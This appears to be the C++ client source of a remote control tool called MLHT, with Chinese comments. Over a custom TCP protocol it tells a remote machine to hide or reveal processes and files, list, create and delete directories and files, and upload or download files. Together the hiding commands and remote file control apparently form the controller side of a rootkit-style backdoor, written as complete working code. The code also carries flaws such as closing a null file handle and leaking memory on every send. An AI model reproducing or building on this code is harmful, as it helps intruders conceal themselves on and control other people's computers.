#include "MLHT_CLIENT.h"


//初始化客户端
MLHT_CLIENT::MLHT_CLIENT(char* ip,int port){

	IDtt = 1;

	p_send = new MLHT();
	p_get = new MLHT();

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//本函数必须是应用程序或DLL调用的第一个Windows Sockets函数。
	//它允许应用程序或DLL指明Windows Sockets API的版本号及获得特定Windows Sockets实现的细节。
	//应用程序或DLL只能在一次成功的WSAStartup()调用之后才能调用进一步的Windows Sockets API函数
	
	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);			//初始化socket
	sockaddr.sin_family = PF_INET;							//sin_family指代协议族，在socket编程中只能是PF_INET

	strcpy_s(server_ip,strlen(ip)+1,ip);
	sockaddr.sin_addr.S_un.S_addr = inet_addr(server_ip);	//连接服务器的IP地址
	server_port = port;
	sockaddr.sin_port = htons(server_port);					//连接服务器的端口
}

//连接服务端
bool MLHT_CLIENT::ConnectServer(){

	if(connect(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR)) == 0)
		return true;
	else
		return false;

}

bool MLHT_CLIENT::CloseSocket(){
	int iResult = closesocket(s);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return false;
    }

    WSACleanup();
    return true;
}

//等待返回报文，检测返回报文是否合法
int MLHT_CLIENT::WaitReturnPacket(){
		
	ZeroMemory(buffer, sizeof(buffer));

	if(recv(s, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
		if(p_get->PacketAccept(((BYTE*)buffer)))
			return PACKET_ACCEPT_SUCCESS;
		else
			return PACKET_ACCEPT_FAIL;
	}
		
	return SOCKET_ERROR;

}

//等待ACK返回报文
int MLHT_CLIENT::WaitForAckPacket(){

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return GET_ACK;
	else
		return NOT_GET_ACK;

}

//发无参数报文
void MLHT_CLIENT::SendPacket(WORD mtu_type){

	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type);
	p_send->PacketSplice((BYTE*)buffer);
	send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

}

//发带参数报文
void MLHT_CLIENT::SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
	p_send->PacketSplice((BYTE*)buffer);
	send(s,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

}

//发ACK返回报文
void MLHT_CLIENT::SendACKPacket(){
	SendPacket(MLHT_MTU_TYPE_ACK | p_get->GetPacketType());
}

//发FIN返回报文
void MLHT_CLIENT::SendFINPacket(){
	SendPacket(MLHT_MTU_TYPE_FIN);
}


bool MLHT_CLIENT::IsAckPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_ACK;
}


bool MLHT_CLIENT::IsFinPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_FIN;
}


bool MLHT_CLIENT::IsReturnPacket(){
	return p_get->PacketAnalyze_FILE() == p_send->PacketAnalyze_FILE();
}


//传输文件包
int MLHT_CLIENT::SendFilePacket(
	WORD mtu_type,			//文件操作协议类型
	FILE *fp,				//所传输文件的指针
	int contentlen			//文件长度
	)
{
	int ret;

	//计算总分片数
	WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
	if(contentlen % MLHT_SLICE_FILE_LENGTH)
		slice_sum++;
		
	char p[MLHT_SLICE_FILE_LENGTH]={0};		//文件指针
	int packetlen = MLHT_SLICE_FILE_LENGTH;	//分片长度

	//分片1->n: 向客户端/服务器发送文件分片
	for(WORD slice_num = 1;slice_num <= slice_sum;slice_num++){
		
		if(slice_num == slice_sum)									// 设置末尾分片长度
			packetlen = contentlen % MLHT_SLICE_FILE_LENGTH;

		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET);	// 顺序定位文件指针
		fread(p,packetlen,1,fp);									// 丛文件指针开始读

		SendPacket(mtu_type,slice_num,slice_sum,p,packetlen);		// 发送文件报文

		//判断是否返回ACK包
		ret = WaitForAckPacket();
		if(ret != GET_ACK)
			return OP_FAIL;
	}

	return OP_SUCCESS;

}


//接收文件包
int MLHT_CLIENT::GetFilePacket(
	FILE *fp				//保存目标文件的指针
	)
{
	int ret;

	do{
		ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;

		if(IsReturnPacket()){
			if(fwrite(p_get->GetPacketContent(),
				p_get->GetPacketLength()-MLHT_HEADER_LENGTH,
				1,
				fp)!= 1){
					SendFINPacket();
					return FILE_WRITE_FAIL;
			}
			else
				SendACKPacket();
		}
		else if(IsFinPacket()){
			return OP_FAIL;
		}
	}while(!p_get->IsLastPacket());
	
	return OP_SUCCESS;
}
					

//进程显示
int MLHT_CLIENT::ShowProcess(){
	SendPacket(MLHT_MTU_TYPE_PROCESS_SHOW);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//进程隐藏
int MLHT_CLIENT::HideProcess(){
	SendPacket(MLHT_MTU_TYPE_PROCESS_HIDE);	
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//文件显示
int MLHT_CLIENT::ShowFile(){
	SendPacket(MLHT_MTU_TYPE_FILE_SHOW);
		
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}
	
//文件隐藏
int MLHT_CLIENT::HideFile(){
	SendPacket(MLHT_MTU_TYPE_FILE_HIDE);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}

//Shell操作
int MLHT_CLIENT::ShellLs(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,filedir,strlen(filedir)+1);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsReturnPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;

}


int MLHT_CLIENT::ShellMkdir(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_MKDIR,1,1,filedir,strlen(filedir)+1);

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;
	
	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


int MLHT_CLIENT::ShellRmdir(char* filedir){
	SendPacket(MLHT_MTU_TYPE_SHELL_RMDIR,1,1,filedir,strlen(filedir)+1);
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;
	
	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


int MLHT_CLIENT::ShellRm(char* filename){
	SendPacket(MLHT_MTU_TYPE_SHELL_RM,1,1,filename,strlen(filename)+1);
	
	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return OP_SUCCESS;
	else if(IsFinPacket())
		return OP_FAIL;
	else
		return SOMETHINGWRONG;
}


//上传文件
int MLHT_CLIENT::UpLoadFile(
	char* uploadFilename,	//上传的源文件路径
	char* uploadFiledir		//上传的目标文件路径
	)
{
	//判断文件路径是否合法
	FILE *fp = fopen(uploadFilename,"rb");

	if(fp == NULL){
		fclose(fp);
		return FILE_READ_FAIL;
	}
		
	//计算文件大小是否过大
	fseek(fp,0L,SEEK_END);			// 定位到文件末尾
	int contentlen = ftell(fp);		// 返回指针偏离文件头的位置(即文件中字符个数)
	if(contentlen > MAX_FILE_SIZE){
		fclose(fp);
		return FILE_TOO_LARGE;
	}

	SendPacket(MLHT_MTU_TYPE_SHELL_UPLOAD,1,1,uploadFiledir,strlen(uploadFiledir)+1);

	//判断是否返回ACK包,
	if(WaitForAckPacket() != GET_ACK){
		fclose(fp);
		return OP_FAIL;
	}

	int ret = SendFilePacket(MLHT_MTU_TYPE_SHELL_UPLOAD,fp,contentlen);
	fclose(fp);
	return ret;

}

	
//下载文件
int MLHT_CLIENT::DownLoadFile(
	char* downloadFilename,	//下载文件路径
	char* downloadFiledir	//存到的本地目录路径
	)
{
	//检测本地目录是否合法
	FILE* fp = fopen(downloadFiledir,"ab");
	if(fp == NULL){
		fclose(fp);
		return FILE_OPEN_FAIL;
	}

	SendPacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,1,1,downloadFilename,strlen(downloadFilename)+1);
	
	//判断是否返回ACK包,
	if(WaitForAckPacket() != GET_ACK){
		fclose(fp);
		return OP_FAIL;
	}

	int ret = GetFilePacket(fp);
	fclose(fp);
	return ret;

}
